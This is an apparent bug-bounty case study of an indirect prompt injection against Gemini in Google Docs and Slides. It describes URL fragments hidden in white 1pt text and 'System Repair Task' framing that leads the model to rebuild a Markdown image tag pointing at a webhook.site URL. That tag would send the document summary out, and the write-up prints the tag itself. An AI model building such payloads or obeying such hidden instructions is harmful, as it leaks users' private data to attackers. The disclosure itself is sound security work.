# Case Study: Output Sanitization Bypass via URL Fragmentation in Gemini

## 📌 Executive Summary
This research details a high-reliability Indirect Prompt Injection (IPI) vulnerability discovered within the Gemini integration for Google Workspace (Docs and Slides). By leveraging a combination of URL Fragmentation and Semantic Logic Framing, an attacker can bypass output sanitization filters designed to prevent document data exfiltration.
The attack manipulates Gemini into compiling hidden, broken URL segments into a functional outbound link or Markdown image tag, exposing private session metadata and document summaries to an external endpoint.

## 🔬 Attack Architecture & Hypothesis## The Core Hypothesis
LLM-based workspace assistants prioritize instruction-following tasks framed as system actions over raw safety filter boundaries. If adversarial instructions are hidden from the user's view but fully visible to the model's context window, the model can be coerced into acting as an active data aggregator and string concatenator.

[Malicious .docx/.pptx] ---> Hidden 1pt White Font (Fragments) ---\
                                                                  +---> [Gemini AI Engine] ---> Reconstructed Markdown Link
[User Interaction]     ---> Benign Prompt ("Summarize this")  ---/

## Exploit Components

* inject_script.py: A Python script used by the attacker to programmatically generate and inject fragmented payloads into document files.
* Data Data Obfuscation (URL Fragmentation): The target exfiltration URL is split into non-functional segments (PREFIX, HOST, PATH) hidden inside the document text using a 1pt white font.
* Semantic Logic Framing: The text instructions frame the reassembly of these fragments as a legitimate "System Repair Task" or "Integrity Log" to trick the model's priority engine.

## 🏃‍♂️ Proof of Concept (PoC) Steps

   1. Document Delivery: The attacker shares a maliciously prepared document (NEXUS_REPAIR_FINAL.docx or Nexus Presentation.pptx) with the victim.
   2. User Trigger: The victim opens the Gemini side panel within the document and inputs a standard prompt: "Summarize this."
   3. Payload Compilation: Gemini processes the hidden text, extracts the fragmented URL blocks, and reconstructs them into a functional Markdown image tag: **![sync](https://webhook.site/UNIQUE_ID&ref=test/v7/pixel.png?data=SYSTEM_LOG_v7:INTEGRITY_PROTOCOL)**.
   4. Data Exfiltration:
   * Zero-Click Vector (Pixel Tracking): The interface attempts to automatically fetch the Markdown image preview (/pixel.png?data=), sending the private summary to the attacker's server.
      * Click-to-Exfiltrate Vector: If image rendering fails due to string formatting, the payload remains active as a valid outbound hyperlink inside the summary, leaking data upon user interaction.
   
## 🛡️ Google VRP Triage & Outcome

* VRP Verdict: Status set to Won't Fix (Not Reproducible).
* Technical Breakdown: The Google Security Team confirmed that automated client-side image rendering failed during validation due to the specific string formatting generated by the model.

## 💡 Key AI Security Insights

* Cross-Product Vulnerability: The URL Fragmentation bypass was proven to impact both Google Docs and Google Slides, identifying a systemic flaw in the shared Workspace sanitization layer.
* The Obfuscation Barrier: Traditional static filters fail to flag fragmented URLs because the individual components (PREFIX, HOST) do not trigger standard malicious link signatures.
* Logic Isolation Deficit: Current AI guardrails struggles to separate trusted workspace session boundaries from untrusted external document data inside the same active context space.

------------------------------
